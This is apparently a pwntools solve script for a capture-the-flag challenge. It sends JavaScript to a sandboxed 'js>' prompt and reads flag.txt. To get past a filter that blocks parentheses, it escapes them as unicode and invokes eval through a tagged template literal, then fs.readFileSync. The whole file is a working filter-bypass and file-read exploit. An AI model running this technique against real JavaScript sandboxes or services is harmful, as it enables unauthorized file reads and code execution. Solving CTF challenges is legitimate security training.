from pwn import *
from config import REMOTE_ADDR, REMOTE_PORT

REMOTE = 0  # Change to 1 to run the exploit on the remote instance

if REMOTE:
    p = remote(REMOTE_ADDR, REMOTE_PORT)
else:
    p = process(["python3", "-u", "chal.py"])

GET_FLAG_PAYLOAD = """require('fs').readFileSync('flag.txt', 'utf8')"""

def run_js(script):
    p.sendlineafter(b"js> ", script.encode())
    
    p.recvuntil(b"stdout: ")
    stdout = bytes.fromhex(p.recvline().decode()).decode()

    p.recvuntil(b"stderr: ")
    stderr = bytes.fromhex(p.recvline().decode()).decode()

    return stdout, stderr

payload_str = GET_FLAG_PAYLOAD.replace("(", "\\u0028").replace(")", "\\u0029")

stdout, stderr = run_js(f"eval.call`${{\"{payload_str}\"}}`")

print(stdout, stderr)

p.sendline(b"")
p.recvall()